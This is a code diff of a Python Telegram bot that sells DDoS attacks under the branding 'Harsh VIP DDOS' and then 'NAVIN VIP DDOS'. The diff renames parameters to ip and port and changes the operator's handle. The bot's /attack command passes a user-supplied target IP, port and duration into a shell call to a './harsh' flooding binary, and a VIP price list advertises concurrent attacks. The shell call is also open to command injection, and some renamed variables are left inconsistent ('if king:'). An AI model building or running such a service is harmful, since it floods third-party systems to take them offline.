@@ -1,4 +1,4 @@
-#@HarshOP001
+#@Navin_Pre
 
 import telebot
 import subprocess
@@ -58,7 +58,7 @@ def read_free_users():
 
 allowed_user_ids = read_users()
 
-def log_command(user_id, king, soulking, time):
+def log_command(user_id, ip, port, time):
     user_info = bot.get_chat(user_id)
     if user_info.username:
         username = "@" + user_info.username
@@ -66,7 +66,7 @@ def log_command(user_id, king, soulking, time):
         username = f"UserID: {user_id}"
     
     with open(LOG_FILE, "a") as file:  # Open in "append" mode
-        file.write(f"Username: {username}\nking: {king}\nsoulking: {soulking}\nTime: {time}\n\n")
+        file.write(f"Username: {username}\nip: {ip}\nport: {port}\nTime: {time}\n\n")
 
 def clear_logs():
     try:
@@ -80,12 +80,12 @@ def clear_logs():
         response = "No logs found to clear."
     return response
 
-def record_command_logs(user_id, command, king=None, soulking=None, time=None):
+def record_command_logs(user_id, command, ip=None, port=None, time=None):
     log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
     if king:
-        log_entry += f" | king: {king}"
+        log_entry += f" | ip: {ip}"
     if soulking:
-        log_entry += f" | soulking: {soulking}"
+        log_entry += f" | port: {port}"
     if time:
         log_entry += f" | Time: {time}"
     
@@ -209,11 +209,11 @@ def show_user_id(message):
     response = f"🤖Your ID: {user_id}"
     bot.reply_to(message, response)
 
-def start_attack_reply(message, king, soulking, time):
+def start_attack_reply(message, ip, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, ✅🔥𝘾𝙊𝙉𝙂𝙍𝘼𝙏𝙐𝙇𝘼𝙏𝙄𝙊𝙉𝙎🔥✅\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {king}\n𝐏𝐨𝐫𝐭: {soulking}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: Harsh\n\n🌟 Harsh DDOS OFFICIAL..!💀"
+    response = f"{username}, ✅🔥𝘾𝙊𝙉𝙂𝙍𝘼𝙏𝙐𝙇𝘼𝙏𝙄𝙊𝙉𝙎🔥✅\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {ip}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: Navin\n\n🌟 Harsh DDOS OFFICIAL..!💀"
     bot.reply_to(message, response)
 
 soul_cooldown = {}
@@ -241,16 +241,16 @@ def handle_soul(message):
             if time > 241:
                 response = "Error: Time interval must be less than 240."
             else:
-                record_command_logs(user_id, '/soul_compiled', king, soulking, time)
-                log_command(user_id, king, soulking, time)
-                start_attack_reply(message, king, soulking, time)  
-                full_command = f"./harsh {king} {soulking} {time} 1200"
+                record_command_logs(user_id, '/ip_compiled', ip, port, time)
+                log_command(user_id, ip, port,  time)
+                start_attack_reply(message, ip, port, time)  
+                full_command = f"./harsh {ip} {port} {time} 1200"
                 subprocess.run(full_command, shell=True)
-                response = f"-漫~*'¨¯¨'*·舞~ 🇮🇳ąɬɬąƈƙ ƈơɱ℘Ɩɛɬɛɖ🇮🇳 ~舞*'¨¯¨'*·~漫- king: {king} soulking: {soulking} soulking: {time}"
+                response = f"-漫~*'¨¯¨'*·舞~ 🇮🇳ąɬɬąƈƙ ƈơɱ℘Ɩɛɬɛɖ🇮🇳 ~舞*'¨¯¨'*·~漫- ip: {ip} port: {port} time: {time}"
         else:
-            response = "✅A͢v͢a͢i͢l͢a͢b͢l͢e͢ r͢i͢g͢h͢t͢ n͢o͢w͢✅ :- /attack <king> <soulking> <time>"  
+            response = "✅A͢v͢a͢i͢l͢a͢b͢l͢e͢ r͢i͢g͢h͢t͢ n͢o͢w͢✅ :- /attack <ip> <port> <time>"  
     else:
-        response = " ミ🥹★ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘭𝘦 𝘭𝘦 𝘣𝘳𝘰 ★🥹彡DM - @HarshOP001 ."
+        response = " ミ🥹★ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘭𝘦 𝘭𝘦 𝘣𝘳𝘰 ★🥹彡DM - @Navin_Pre ."
 
     bot.reply_to(message, response)
 
@@ -301,7 +301,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''ıllıllı⭐🌟 W͙e͙l͙c͙o͙m͙e͙ t͙o͙ Harsh VIP DDOS ❣️ 🌟⭐ıllıllı \n {user_name}! \n🄱🄶🄼🄸 🄺🄸 🄶🄰🄽🄳 🄼🄰🅁🄽🄴 🄰🄰 🄶🅈🄴😜
+    response = f'''ıllıllı⭐🌟 W͙e͙l͙c͙o͙m͙e͙ t͙o͙ NAVIN VIP DDOS ❣️ 🌟⭐ıllıllı \n {user_name}! \n🄱🄶🄼🄸 🄺🄸 🄶🄰🄽🄳 🄼🄰🅁🄽🄴 🄰🄰 🄶🅈🄴😜
 🤖Try To Run This Command : /help 
 '''
     bot.reply_to(message, response)
@@ -327,7 +327,7 @@ Vip 🌟 :
 -> Concurrents Attack : 3
 
 Pr-ice List💸 :
-massage :- @HarshOP001
+massage :- @Navin_Pre
 '''
     bot.reply_to(message, response)
 
